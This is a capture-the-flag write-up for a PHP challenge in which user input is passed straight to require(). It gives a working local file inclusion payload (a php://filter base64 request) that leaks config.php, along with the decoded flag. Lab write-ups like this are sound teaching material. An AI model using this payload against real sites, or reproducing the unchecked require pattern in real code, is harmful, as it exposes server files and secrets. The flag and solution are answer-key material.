# lfi1

## What it is

It's a PHP website with links to youtube videos, the flag is in one of the comments of the videos (supposedly).

We have access to the source of index.php.

Line 61:
```php
require('config.php');
```
This file probably contains the flag.

At line 62 we have this:
```php
if (isset($_GET['lang']))
{
  require($_GET['lang']);
}
```
It directly gives user input to ```require```.

## Solution

https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/

We can make the server require config.php, but the php in it will be executed.

To prevent that we can use ```php://filter/convert.base64-encode/resource=config.php```.
```
https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
```

This base64 string will be at the top of the page:
```
PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==
```

After decoding it:
```php
<?php
  // Congratz ! FLAG IS BFS{U_h4v3_Un0!!!}
?>
```

flag: ```BFS{U_h4v3_Un0!!!}```
